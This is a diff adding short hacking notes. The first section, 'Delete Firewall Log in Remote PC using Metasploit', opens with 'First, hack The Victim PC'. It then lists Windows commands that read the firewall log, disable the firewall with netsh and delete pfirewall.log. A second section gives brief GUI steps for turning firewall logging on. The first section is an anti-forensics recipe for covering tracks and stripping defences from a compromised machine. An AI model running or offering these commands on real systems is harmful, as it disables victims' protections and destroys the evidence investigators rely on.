@@ -1,0 +1,17 @@
+Delete Firewall Log in Remote PC using Metasploit
+
+First, hack The Victim PC
+inside windows/system32
+cd Logfiles/firewall
+dir
+type pfirewall.log
+netsh firewall set opmode mode=disable
+del pfirewall.log
+---------------------------------------------------------
+Enable and Monitor Firewall Log in Windows PC
+
+firewall then select advance setting on the left side under the control panel home
+properties tab
+private profile
+Change “NO (default)” into “YES”
+-----------------------------------------------------------------------------------------
